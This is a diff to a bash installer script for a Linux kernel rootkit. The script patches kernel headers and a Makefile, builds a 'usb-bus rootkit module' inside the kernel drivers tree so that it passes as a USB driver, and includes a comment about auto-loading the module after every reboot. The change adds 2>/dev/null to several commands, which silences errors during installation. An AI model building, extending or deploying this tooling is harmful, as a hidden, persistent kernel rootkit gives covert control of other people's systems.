@@ -87,24 +87,24 @@ if [ "$USER" == "root" ]; then
     echo "failed, trying some fixes"
     #copy the headers
     if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
-      cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
+      cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include 2>/dev/null
       if [ "$?" == "1" ]; then
-        cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
+        cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include 2>/dev/null
       fi
     fi
     if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/uapi/asm" ]; then
-      cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/uapi/asm /usr/src/linux-headers-$(uname -r)/include/uapi
+      cp -r /usr/src/linux-headers-$(uname -r)/arch/x86/include/uapi/asm /usr/src/linux-headers-$(uname -r)/include/uapi 2>/dev/null
     fi
     gcc --version | grep "7\." &>/dev/null
     if [ "$?" == "0" ]; then
       if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
-        cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
+        cp /usr/lib/gcc/x86_64-linux-gnu/7/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h 2>/dev/null
       fi
     else
       gcc --version | grep "8\." &>/dev/null
       if [ "$?" == "0" ]; then
         if [ ! -e "/usr/src/linux-headers-$(uname -r)/include/stdarg.h" ]; then
-          cp /usr/lib/gcc/x86_64-linux-gnu/8/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h
+          cp /usr/lib/gcc/x86_64-linux-gnu/8/include/stdarg.h /usr/src/linux-headers-$(uname -r)/include/stdarg.h 2>/dev/null
         fi
       fi
     fi
@@ -115,13 +115,13 @@ if [ "$USER" == "root" ]; then
     printf "patch the makefile... "
     patch -b -d /$location </$location/mkfile.patch &>/dev/null
     finish
-    rm /$location/mkfile.patch
+    rm /$location/mkfile.patch 2>/dev/null
     #make the usb-bus module
     printf "make the usb-bus rootkit module... "
     make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
     finish
-    rm /$location/Makefile
-    mv /$location/Makefile.* /$location/Makefile
+    rm /$location/Makefile 2>/dev/null
+    mv /$location/Makefile.* /$location/Makefile 2>/dev/null
   fi
 
   #make module auto-load after every reboot (dangerous, the computer might start having problems at boot)
